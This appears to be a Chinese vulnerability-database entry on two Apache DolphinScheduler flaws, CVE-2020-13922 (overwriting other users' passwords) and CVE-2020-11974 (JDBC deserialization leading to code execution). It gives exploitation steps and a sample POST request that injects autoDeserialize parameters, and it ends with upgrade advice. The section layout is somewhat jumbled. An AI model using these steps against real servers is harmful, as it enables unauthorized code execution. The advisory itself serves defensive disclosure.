---
title: 'Apache DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）'
date: Sun, 13 Sep 2020 10:22:11 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 漏洞描述

Apache软件基金会发布安全公告，修复了Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）与Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974）。 CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“ autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。 CVE-2020-13922导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：api interface /dolphinscheduler/users/update，请相关用户及时升级进行防护。

#### 影响范围

Apache DolphinScheduler权限覆盖漏洞（CVE-2020-13922）

#### 受影响版本

Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1

#### 不受影响版本

Apache DolphinScheduler >= 1.3.2 Apache DolphinScheduler远程执行代码漏洞（CVE-2020-11974） 它是⼀个分布式去中⼼化，易扩展的可视化DAG(有向⽆环图)⼯作流任务调度系统。利⽤漏洞:需要登录权限, \[09/12 态势感知\]提供⼀组默认密码。 该漏洞存在于数据源中⼼未限制添加的jdbc连接参数,从⽽实现JDBC客户端反序列化。

1、登录到⾯板 -> 数据源中⼼。

 ![](Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/wp_editor_md_82bb068553ed084522f99c82bb20138f.jpg)

2、jdbc连接参数就是主⻆,这⾥没有限制任意类型的连接串参数。 ![](Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/wp_editor_md_3554066562de399e0d191c5ce7d803ab.jpg)

3、将以下数据添加到jdbc连接参数中,就可以直接触发。 ![](Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/wp_editor_md_15a00215f3b910880ff67daed2b15f71.jpg)

```
POST /dolphinscheduler/datasources/connect HTTP/1.1
type=MYSQL&name=test¬e=&host=127.0.0.1&port=3306&database=test&
principal=&userName=root&password=root&connectType=&
other={"detectCustomCollations":true,"autoDeserialize":true} 
```



```

#### 受影响版本

Apache DolphinScheduler = 1.2.0、1.2.1

#### 不受影响版本

Apache DolphinScheduler >= 1.3.1

#### 修复建议

官方升级 目前官方已在最新版本中修复了此次的漏洞，请受影响的用户尽快升级版本至1.3.2进行防护。
官方下载链接： https://dolphinscheduler.apache.org/zhcn/docs/release/download.html
```